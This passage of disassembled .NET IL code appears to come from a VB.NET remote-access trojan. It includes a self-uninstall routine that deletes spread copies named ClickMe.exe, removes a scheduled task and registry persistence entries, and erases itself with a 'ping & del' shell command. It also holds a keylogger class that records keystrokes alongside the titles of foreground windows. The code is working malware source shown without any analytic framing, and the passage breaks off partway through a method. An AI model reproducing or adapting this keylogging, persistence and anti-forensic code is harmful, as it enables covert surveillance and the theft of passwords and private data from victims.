      IL_0046:  ldc.i4.0
      IL_0047:  stloc.0
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0052:  leave.s    IL_0054

    }  // end handler
    IL_0054:  ldloc.0
    IL_0055:  ret
  } // end of method OK::STV

  .method public static void  UNS() cil managed noinlining nooptimization
  {
    // Code size       526 (0x20e)
    .maxstack  4
    .locals init (string V_0,
             string[] V_1,
             int32 V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7)
    IL_0000:  call       class My.MyComputer My.MyProject::get_Computer()
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
    IL_000a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
    IL_000f:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
    IL_0014:  stloc.0
    IL_0015:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
    IL_001a:  stloc.1
    IL_001b:  ldc.i4.0
    IL_001c:  stloc.2
    IL_001d:  br.s       IL_0057

    IL_001f:  ldloc.1
    IL_0020:  ldloc.2
    IL_0021:  ldelem.ref
    IL_0022:  stloc.0
    .try
    {
      IL_0023:  ldloc.0
      IL_0024:  ldstr      "ClickMe.exe"
      IL_0029:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_002e:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0033:  brfalse.s  IL_0045

      IL_0035:  ldloc.0
      IL_0036:  ldstr      "ClickMe.exe"
      IL_003b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0040:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0045:  leave.s    IL_0053

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0051:  leave.s    IL_0053

    }  // end handler
    IL_0053:  ldloc.2
    IL_0054:  ldc.i4.1
    IL_0055:  add.ovf
    IL_0056:  stloc.2
    IL_0057:  ldloc.2
    IL_0058:  ldloc.1
    IL_0059:  ldlen
    IL_005a:  conv.i4
    IL_005b:  blt.s      IL_001f

    IL_005d:  nop
    .try
    {
      IL_005e:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0063:  ldstr      "obito.txt"
      IL_0068:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_006d:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_0072:  brfalse.s  IL_0088

      IL_0074:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0079:  ldstr      "obito.txt"
      IL_007e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0083:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0088:  leave.s    IL_0096

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_008a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_008f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0094:  leave.s    IL_0096

    }  // end handler
    IL_0096:  ldstr      "schtasks /delete /tn CleanSweepCheck /f"
    IL_009b:  ldc.i4.0
    IL_009c:  ldc.i4.1
    IL_009d:  ldc.i4     0x1388
    IL_00a2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                               valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                               bool,
                                                                                               int32)
    IL_00a7:  pop
    IL_00a8:  ldc.i4.0
    IL_00a9:  call       void j.OK::pr(int32)
    IL_00ae:  ldc.i4.0
    IL_00af:  stsfld     bool j.OK::Isu
    .try
    {
      IL_00b4:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_00b9:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00be:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_00c3:  ldsfld     string j.OK::sf
      IL_00c8:  ldc.i4.1
      IL_00c9:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_00ce:  ldsfld     string j.OK::RG
      IL_00d3:  ldc.i4.0
      IL_00d4:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_00d9:  leave.s    IL_00f4

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00db:  dup
      IL_00dc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00e1:  stloc.3
      IL_00e2:  ldloc.3
      IL_00e3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ed:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00f2:  leave.s    IL_00f4

    }  // end handler
    IL_00f4:  nop
    .try
    {
      IL_00f5:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_00fa:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00ff:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
      IL_0104:  ldsfld     string j.OK::sf
      IL_0109:  ldc.i4.1
      IL_010a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_010f:  ldsfld     string j.OK::RG
      IL_0114:  ldc.i4.0
      IL_0115:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_011a:  leave.s    IL_0137

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_011c:  dup
      IL_011d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0122:  stloc.s    V_4
      IL_0124:  ldloc.s    V_4
      IL_0126:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_012b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0130:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0135:  leave.s    IL_0137

    }  // end handler
    IL_0137:  nop
    .try
    {
      IL_0138:  ldsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_013d:  brfalse.s  IL_0168

      IL_013f:  ldsfld     class [mscorlib]System.IO.FileStream j.OK::FS
      IL_0144:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0149:  ldc.i4.7
      IL_014a:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_014f:  ldstr      "\\"
      IL_0154:  ldsfld     string j.OK::RG
      IL_0159:  ldstr      ".exe"
      IL_015e:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0163:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_0168:  leave.s    IL_0185

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_016a:  dup
      IL_016b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0170:  stloc.s    V_5
      IL_0172:  ldloc.s    V_5
      IL_0174:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0179:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0183:  leave.s    IL_0185

    }  // end handler
    IL_0185:  nop
    .try
    {
      IL_0186:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_018b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0190:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0195:  ldstr      "Software"
      IL_019a:  ldc.i4.1
      IL_019b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01a0:  ldsfld     string j.OK::RG
      IL_01a5:  ldc.i4.0
      IL_01a6:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteSubKey(string,
                                                                                             bool)
      IL_01ab:  leave.s    IL_01c8

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ad:  dup
      IL_01ae:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b3:  stloc.s    V_6
      IL_01b5:  ldloc.s    V_6
      IL_01b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01c1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01c6:  leave.s    IL_01c8

    }  // end handler
    IL_01c8:  nop
    .try
    {
      IL_01c9:  ldstr      "cmd.exe /c ping 0 -n 2 & del \""
      IL_01ce:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_01d3:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_01d8:  ldstr      "\""
      IL_01dd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_01e2:  ldc.i4.0
      IL_01e3:  ldc.i4.0
      IL_01e4:  ldc.i4.m1
      IL_01e5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_01ea:  pop
      IL_01eb:  leave.s    IL_0208

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01ed:  dup
      IL_01ee:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f3:  stloc.s    V_7
      IL_01f5:  ldloc.s    V_7
      IL_01f7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01fc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0201:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0206:  leave.s    IL_0208

    }  // end handler
    IL_0208:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_020d:  ret
  } // end of method OK::UNS

  .method public static uint8[]  ZIP(uint8[] B) cil managed
  {
    // Code size       105 (0x69)
    .maxstack  4
    .locals init (class [mscorlib]System.IO.MemoryStream V_0,
             class [System]System.IO.Compression.GZipStream V_1,
             uint8[] V_2,
             int32 V_3,
             uint8[] V_4)
    IL_0000:  ldarg.0
    IL_0001:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  ldc.i4.0
    IL_0009:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode)
    IL_000e:  stloc.1
    IL_000f:  ldc.i4.4
    IL_0010:  newarr     [mscorlib]System.Byte
    IL_0015:  stloc.2
    IL_0016:  ldloc.0
    IL_0017:  ldloc.0
    IL_0018:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
    IL_001d:  ldc.i4.5
    IL_001e:  conv.i8
    IL_001f:  sub.ovf
    IL_0020:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_0025:  ldloc.0
    IL_0026:  ldloc.2
    IL_0027:  ldc.i4.0
    IL_0028:  ldc.i4.4
    IL_0029:  callvirt   instance int32 [mscorlib]System.IO.MemoryStream::Read(uint8[],
                                                                               int32,
                                                                               int32)
    IL_002e:  pop
    IL_002f:  ldloc.2
    IL_0030:  ldc.i4.0
    IL_0031:  call       int32 [mscorlib]System.BitConverter::ToInt32(uint8[],
                                                                      int32)
    IL_0036:  stloc.3
    IL_0037:  ldloc.0
    IL_0038:  ldc.i4.0
    IL_0039:  conv.i8
    IL_003a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_003f:  ldloc.3
    IL_0040:  ldc.i4.1
    IL_0041:  sub.ovf
    IL_0042:  ldc.i4.1
    IL_0043:  add.ovf
    IL_0044:  ldc.i4.1
    IL_0045:  sub.ovf
    IL_0046:  ldc.i4.1
    IL_0047:  add.ovf
    IL_0048:  newarr     [mscorlib]System.Byte
    IL_004d:  stloc.s    V_4
    IL_004f:  ldloc.1
    IL_0050:  ldloc.s    V_4
    IL_0052:  ldc.i4.0
    IL_0053:  ldloc.3
    IL_0054:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_0059:  pop
    IL_005a:  ldloc.1
    IL_005b:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0060:  ldloc.0
    IL_0061:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0066:  ldloc.s    V_4
    IL_0068:  ret
  } // end of method OK::ZIP

} // end of class j.OK

.class public auto ansi j.kl
       extends [mscorlib]System.Object
{
  .field private string LastAS
  .field private int32 LastAV
  .field private valuetype [System.Windows.Forms]System.Windows.Forms.Keys lastKey
  .field public string Logs
  .field public string vn
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       36 (0x24)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldc.i4.0
    IL_0008:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys j.kl::lastKey
    IL_000d:  ldarg.0
    IL_000e:  ldstr      ""
    IL_0013:  stfld      string j.kl::Logs
    IL_0018:  ldarg.0
    IL_0019:  ldstr      "[kl]"
    IL_001e:  stfld      string j.kl::vn
    IL_0023:  ret
  } // end of method kl::.ctor

  .method private instance string  AV() cil managed
  {
    // Code size       216 (0xd8)
    .maxstack  5
    .locals init (string V_0,
             int32 V_1,
             native int V_2,
             class [System]System.Diagnostics.Process V_3,
             valuetype [mscorlib]System.DateTime V_4,
             class [mscorlib]System.Exception V_5)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldloca.s   V_1
      IL_0009:  call       int32 j.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_000e:  pop
      IL_000f:  ldloc.1
      IL_0010:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
      IL_0015:  stloc.3
      IL_0016:  ldloca.s   V_2
      IL_0018:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_001d:  ldarg.0
      IL_001e:  ldfld      int32 j.kl::LastAV
      IL_0023:  ceq
      IL_0025:  ldarg.0
      IL_0026:  ldfld      string j.kl::LastAS
      IL_002b:  ldloc.3
      IL_002c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0031:  ldc.i4.0
      IL_0032:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0037:  ldc.i4.0
      IL_0038:  ceq
      IL_003a:  and
      IL_003b:  ldloc.3
      IL_003c:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0041:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0046:  ldc.i4.0
      IL_0047:  ceq
      IL_0049:  or
      IL_004a:  brtrue.s   IL_00b3

      IL_004c:  ldarg.0
      IL_004d:  ldloca.s   V_2
      IL_004f:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
      IL_0054:  stfld      int32 j.kl::LastAV
      IL_0059:  ldarg.0
      IL_005a:  ldloc.3
      IL_005b:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
      IL_0060:  stfld      string j.kl::LastAS
      IL_0065:  ldc.i4.6
      IL_0066:  newarr     [mscorlib]System.String
      IL_006b:  dup
      IL_006c:  ldc.i4.0
      IL_006d:  ldstr      bytearray (0D 00 0A 00 01 00 ) 
      IL_0072:  stelem.ref
      IL_0073:  dup
      IL_0074:  ldc.i4.1
      IL_0075:  call       valuetype [mscorlib]System.DateTime [Microsoft.VisualBasic]Microsoft.VisualBasic.DateAndTime::get_Now()
      IL_007a:  stloc.s    V_4
      IL_007c:  ldloca.s   V_4
      IL_007e:  ldstr      "yy/MM/dd "
      IL_0083:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_0088:  stelem.ref
      IL_0089:  dup
      IL_008a:  ldc.i4.2
      IL_008b:  ldloc.3
      IL_008c:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_0091:  stelem.ref
      IL_0092:  dup
      IL_0093:  ldc.i4.3
      IL_0094:  ldstr      " "
      IL_0099:  stelem.ref
      IL_009a:  dup
      IL_009b:  ldc.i4.4
      IL_009c:  ldarg.0
      IL_009d:  ldfld      string j.kl::LastAS
      IL_00a2:  stelem.ref
      IL_00a3:  dup
      IL_00a4:  ldc.i4.5
      IL_00a5:  ldstr      bytearray (01 00 0D 00 0A 00 ) 
      IL_00aa:  stelem.ref
      IL_00ab:  call       string [mscorlib]System.String::Concat(string[])
      IL_00b0:  stloc.0
      IL_00b1:  leave.s    IL_00d6

      IL_00b3:  leave.s    IL_00d0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b5:  dup
      IL_00b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00bb:  stloc.s    V_5
      IL_00bd:  ldloc.s    V_5
      IL_00bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00ce:  leave.s    IL_00d0

    }  // end handler
    IL_00d0:  ldstr      ""
    IL_00d5:  stloc.0
    IL_00d6:  ldloc.0
    IL_00d7:  ret
  } // end of method kl::AV

  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       380 (0x17c)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             bool V_2,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_3,
             class [mscorlib]System.Exception V_4,
             char V_5)
    IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_000a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_000f:  stloc.2
    IL_0010:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0015:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_001a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_001f:  brfalse.s  IL_002a

    IL_0021:  ldloc.2
    IL_0022:  brfalse.s  IL_0028

    IL_0024:  ldc.i4.0
    IL_0025:  stloc.2
    IL_0026:  br.s       IL_002a

    IL_0028:  ldc.i4.1
    IL_0029:  stloc.2
    IL_002a:  nop
    .try
    {
      IL_002b:  ldarg.1
      IL_002c:  stloc.3
      IL_002d:  ldloc.3
      IL_002e:  ldc.i4.s   35
      IL_0030:  bgt.s      IL_0066

      IL_0032:  ldloc.3
      IL_0033:  ldc.i4.s   13
      IL_0035:  bgt.s      IL_0050

      IL_0037:  ldloc.3
      IL_0038:  ldc.i4.8
      IL_0039:  beq.s      IL_00a1

      IL_003b:  ldloc.3
      IL_003c:  ldc.i4.s   9
      IL_003e:  beq        IL_00fe

      IL_0043:  ldloc.3
      IL_0044:  ldc.i4.s   13
      IL_0046:  beq        IL_00d9

      IL_004b:  br         IL_0106

      IL_0050:  ldloc.3
      IL_0051:  ldc.i4.s   16
      IL_0053:  sub
      IL_0054:  ldc.i4.1
      IL_0055:  ble.un.s   IL_00c3

      IL_0057:  ldloc.3
      IL_0058:  ldc.i4.s   32
      IL_005a:  beq.s      IL_00ce

      IL_005c:  ldloc.3
      IL_005d:  ldc.i4.s   35
      IL_005f:  beq.s      IL_00c3

      IL_0061:  br         IL_0106

      IL_0066:  ldloc.3
      IL_0067:  ldc.i4     0xa3
      IL_006c:  bgt.s      IL_0087

      IL_006e:  ldloc.3
      IL_006f:  ldc.i4.s   46
      IL_0071:  beq.s      IL_00a1

      IL_0073:  ldloc.3
      IL_0074:  ldc.i4.s   112
      IL_0076:  sub
      IL_0077:  ldc.i4.s   11
      IL_0079:  ble.un.s   IL_00c3

      IL_007b:  ldloc.3
      IL_007c:  ldc.i4     0xa0
      IL_0081:  sub
      IL_0082:  ldc.i4.3
      IL_0083:  ble.un.s   IL_00c3

      IL_0085:  br.s       IL_0106

      IL_0087:  ldloc.3
      IL_0088:  ldc.i4     0x10000
      IL_008d:  beq.s      IL_00c3

      IL_008f:  ldloc.3
      IL_0090:  ldc.i4     0x20000
      IL_0095:  beq.s      IL_00c3

      IL_0097:  ldloc.3
      IL_0098:  ldc.i4     0x40000
      IL_009d:  beq.s      IL_00c3

      IL_009f:  br.s       IL_0106

      IL_00a1:  ldstr      "["
      IL_00a6:  ldarga.s   k
      IL_00a8:  constrained. [System.Windows.Forms]System.Windows.Forms.Keys
      IL_00ae:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_00b3:  ldstr      "]"
      IL_00b8:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_00bd:  stloc.0
      IL_00be:  leave      IL_017a

      IL_00c3:  ldstr      ""
      IL_00c8:  stloc.0
      IL_00c9:  leave      IL_017a

      IL_00ce:  ldstr      " "
      IL_00d3:  stloc.0
      IL_00d4:  leave      IL_017a

      IL_00d9:  ldarg.0
      IL_00da:  ldfld      string j.kl::Logs
      IL_00df:  ldstr      "[ENTER]\r\n"
      IL_00e4:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_00e9:  brfalse.s  IL_00f6

      IL_00eb:  ldstr      ""
      IL_00f0:  stloc.0
      IL_00f1:  leave      IL_017a

      IL_00f6:  ldstr      "[ENTER]\r\n"
      IL_00fb:  stloc.0
      IL_00fc:  leave.s    IL_017a

      IL_00fe:  ldstr      "[TAP]\r\n"
      IL_0103:  stloc.0
      IL_0104:  leave.s    IL_017a

      IL_0106:  ldloc.2
      IL_0107:  brfalse.s  IL_0118

      IL_0109:  ldarg.1
      IL_010a:  conv.ovf.u4
      IL_010b:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_0110:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0115:  stloc.0
      IL_0116:  leave.s    IL_017a

      IL_0118:  ldarg.1
      IL_0119:  conv.ovf.u4
      IL_011a:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_011f:  stloc.1
      IL_0120:  leave.s    IL_0178

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0122:  dup
      IL_0123:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0128:  stloc.s    V_4
      IL_012a:  ldloc.s    V_4
      IL_012c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0131:  ldloc.2
      IL_0132:  brfalse.s  IL_0157

      IL_0134:  ldarg.1
      IL_0135:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_013a:  stloc.s    V_5
      IL_013c:  ldloca.s   V_5
      IL_013e:  call       instance string [mscorlib]System.Char::ToString()
      IL_0143:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0148:  stloc.1
      IL_0149:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_014e:  ldloc.1
      IL_014f:  stloc.0
      IL_0150:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0155:  leave.s    IL_017a

      IL_0157:  ldarg.1
      IL_0158:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_015d:  stloc.s    V_5
      IL_015f:  ldloca.s   V_5
      IL_0161:  call       instance string [mscorlib]System.Char::ToString()
      IL_0166:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_016b:  stloc.1
      IL_016c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0171:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0176:  leave.s    IL_0178

    }  // end handler
    IL_0178:  ldloc.1
    IL_0179:  stloc.0
    IL_017a:  ldloc.0
    IL_017b:  ret
  } // end of method kl::Fix

  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int16  GetAsyncKeyState(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  GetKeyboardLayout(int32 a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  GetKeyboardState(uint8[] a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int a,
                                          int32& b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          uint32  MapVirtualKey(uint32 a,
                                uint32 b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          int32  ToUnicodeEx(uint32 a,
                             uint32 b,
                             uint8[] c,
                             [out] class [mscorlib]System.Text.StringBuilder  marshal( lpwstr) d,
                             int32 e,
                             uint32 f,
                             native int g) cil managed preservesig
  {
  }
  .method private static string  VKCodeToUnicode(uint32 a) cil managed
  {
    // Code size       138 (0x8a)
    .maxstack  7
    .locals init (string V_0,
             class [mscorlib]System.Text.StringBuilder V_1,
             uint8[] V_2,
             uint32 V_3,
             int32 V_4,
             native int V_5,
             class [mscorlib]System.Exception V_6,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_7)
    .try
    {
      IL_0000:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0005:  stloc.1
      IL_0006:  ldc.i4     0xff
